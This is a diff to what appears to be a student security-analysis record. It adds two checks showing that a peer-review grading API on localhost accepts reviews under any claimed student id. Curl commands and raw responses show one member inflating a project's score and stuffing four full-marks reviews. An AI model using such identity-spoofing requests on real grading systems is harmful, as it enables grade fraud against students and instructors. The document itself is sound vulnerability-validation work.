@@ -29,6 +29,8 @@
 | 8f | Weights of `1e308` | Case A: 201 with score 0. Case B: 500 | 201 with `overall_score: 0`; 500 with `NaN` rejected by DB `CHECK` | Yes |
 | 8g | Does the error log expose a peer's identity? | 500, log shows `stu_004` | 500, log shows `stu_004, student_peer` | Yes |
 | 8h | Is a rubric that a project is bound to locked against update and delete? | 409 on both | 409 on PUT and 409 on DELETE | Yes |
+| 8i | Can a project's own member inflate its peer score by claiming a non-member's id? | 201, `overall_score` 100, no `reviewer_id` | 201, 100, no `reviewer_id` | Yes |
+| 8j | Can peer reviews be stuffed under several student ids? | Three more 201s; peer block shows 4 reviews, mean 100 | Three 201s; `review_count` 4, `mean_score` 100, faculty block empty | Yes |
 
 ---
 
@@ -263,11 +265,55 @@ HTTP 409
 
 ---
 
+## 8i and 8j. Peer-review inflation and stuffing under claimed student ids
+
+These two checks support abuse cases AC-4 and AC-10 in `assignment-2/security-analysis.md`. They were run on a fresh stack, so the rubric and review ids differ from earlier checks. The rubric has the same shape as in 8a (two criteria, weights 1 and 2, max points 10 and 20) and is bound to `proj_101`, whose members include `stu_001`. In 8i, a student who is a member of the project wants a high peer score for it, so the request names `stu_004`, who is not a member.
+
+**Predictions (stated in chat before the run):**
+- 8i: `stu_004` as a peer with full points returns 201 with `overall_score` 100 and no `reviewer_id` in the response.
+- 8j: `stu_003`, `stu_005` and `stu_006` each return 201 (a 422 would mean that student is a member of `proj_101`). The summary then shows the peer block with 4 reviews and a mean of 100, and an empty faculty block.
+
+**Commands** (the stack start and the rubric creation, which printed `R`, `C1` and `C2`, are omitted; `rev3` posts a full-marks peer review to `proj_101` with the given reviewer id):
+
+```
+rev3() { curl -s -w "\nHTTP %{http_code}\n" -X POST localhost:3000/api/v1/evaluations/projects/proj_101/reviews -H "Content-Type: application/json" -d "{\"reviewer_id\":\"$1\",\"reviewer_role\":\"student_peer\",\"rubric_id\":\"$R\",\"scores\":[{\"criterion_id\":\"$C1\",\"points\":10},{\"criterion_id\":\"$C2\",\"points\":20}],\"comments\":\"inflate\"}"; }
+echo "--- 8i"
+rev3 stu_004
+echo "--- 8j"
+rev3 stu_003
+rev3 stu_005
+rev3 stu_006
+curl -s -w "\nHTTP %{http_code}\n" localhost:3000/api/v1/evaluations/projects/proj_101/summary
+```
+
+**Observed:**
+
+```
+--- 8i
+{"id":"faf581d2-2ce9-4b45-86e0-9a79f129ce0e","project_id":"proj_101","rubric_id":"59b14dad-daa7-45e8-8e8c-51945a925516","reviewer_role":"student_peer","scores":[{"criterion_id":"d365992a-86e6-4280-b068-f1d83aa49ac5","points":10,"feedback":null},{"criterion_id":"b1e3309c-5009-447f-b26c-5003a92ecb82","points":20,"feedback":null}],"comments":"inflate","overall_score":100,"created_at":"2026-11-17T03:34:12.021Z","updated_at":"2026-11-17T03:34:12.021Z"}
+HTTP 201
+--- 8j
+{"id":"273cce20-f671-4458-8263-0dc9e18c1a1b","project_id":"proj_101","rubric_id":"59b14dad-daa7-45e8-8e8c-51945a925516","reviewer_role":"student_peer","scores":[{"criterion_id":"d365992a-86e6-4280-b068-f1d83aa49ac5","points":10,"feedback":null},{"criterion_id":"b1e3309c-5009-447f-b26c-5003a92ecb82","points":20,"feedback":null}],"comments":"inflate","overall_score":100,"created_at":"2026-11-17T03:34:13.527Z","updated_at":"2026-11-17T03:34:13.527Z"}
+HTTP 201
+{"id":"49c3205c-be44-4c5f-918d-119ce868c6ad","project_id":"proj_101","rubric_id":"59b14dad-daa7-45e8-8e8c-51945a925516","reviewer_role":"student_peer","scores":[{"criterion_id":"d365992a-86e6-4280-b068-f1d83aa49ac5","points":10,"feedback":null},{"criterion_id":"b1e3309c-5009-447f-b26c-5003a92ecb82","points":20,"feedback":null}],"comments":"inflate","overall_score":100,"created_at":"2026-11-17T03:34:14.714Z","updated_at":"2026-11-17T03:34:14.714Z"}
+HTTP 201
+{"id":"175e19fd-9a47-456c-bf52-0c22ba93d212","project_id":"proj_101","rubric_id":"59b14dad-daa7-45e8-8e8c-51945a925516","reviewer_role":"student_peer","scores":[{"criterion_id":"d365992a-86e6-4280-b068-f1d83aa49ac5","points":10,"feedback":null},{"criterion_id":"b1e3309c-5009-447f-b26c-5003a92ecb82","points":20,"feedback":null}],"comments":"inflate","overall_score":100,"created_at":"2026-11-17T03:34:15.638Z","updated_at":"2026-11-17T03:34:15.638Z"}
+HTTP 201
+{"project_id":"proj_101","title":"Threat Modeling Toolkit","course_id":"CS501","section":"A1","lab_id":"lab_cybersec","rubric_id":"59b14dad-daa7-45e8-8e8c-51945a925516","faculty_instructor":{"reviewer_role":"faculty_instructor","review_count":0,"mean_score":null,"std_dev":null,"min_score":null,"max_score":null,"mean_grade_point":null,"grade_distribution":{"A":0,"B":0,"C":0,"D":0,"F":0},"grade_point_trend":[],"criteria":[{"criterion_id":"d365992a-86e6-4280-b068-f1d83aa49ac5","description":"c1","weight":1,"max_points":10,"mean_points":null},{"criterion_id":"b1e3309c-5009-447f-b26c-5003a92ecb82","description":"c2","weight":2,"max_points":20,"mean_points":null}]},"student_peer":{"reviewer_role":"student_peer","review_count":4,"mean_score":100,"std_dev":0,"min_score":100,"max_score":100,"mean_grade_point":4,"grade_distribution":{"A":4,"B":0,"C":0,"D":0,"F":0},"grade_point_trend":[{"submitted_at":"2026-11-17T03:34:12.021Z","overall_score":100,"grade_point":4,"running_mean_grade_point":4},{"submitted_at":"2026-11-17T03:34:13.527Z","overall_score":100,"grade_point":4,"running_mean_grade_point":4},{"submitted_at":"2026-11-17T03:34:14.714Z","overall_score":100,"grade_point":4,"running_mean_grade_point":4},{"submitted_at":"2026-11-17T03:34:15.638Z","overall_score":100,"grade_point":4,"running_mean_grade_point":4}],"criteria":[{"criterion_id":"d365992a-86e6-4280-b068-f1d83aa49ac5","description":"c1","weight":1,"max_points":10,"mean_points":10},{"criterion_id":"b1e3309c-5009-447f-b26c-5003a92ecb82","description":"c2","weight":2,"max_points":20,"mean_points":20}]}}
+HTTP 200
+```
+
+Notes:
+- No credentials of any kind were sent. The server cannot tell that the 8i request came from a member of `proj_101`, because the only identity it sees is the one typed in the body.
+- In 8j, the peer block of the summary includes a `submitted_at` timestamp for each peer review in `grade_point_trend`, visible to any caller. This is recorded as an observation (threat T-14 in `security-analysis.md`), not as a validated vulnerability.
+
+---
+
 ## What these checks show
 
 | Finding | Checks | Scanner detected it? |
 |---|---|---|
-| V1: no authentication; identity is whatever the request body claims | 8a, 8b, 8h | No (Semgrep 0 findings; SonarQube 0 vulnerabilities and 0 security hotspots) |
+| V1: no authentication; identity is whatever the request body claims | 8a, 8b, 8h, 8i, 8j | No (Semgrep 0 findings; SonarQube 0 vulnerabilities and 0 security hotspots) |
 | V2: no ownership check on review update and delete | 8c, 8e | No |
 | V3: peer anonymity broken through error responses | 8d | No |
 | V4: unbounded weights lead to wrong grades, 500 errors and an anonymous reviewer's identity in the log | 8f, 8g | No |
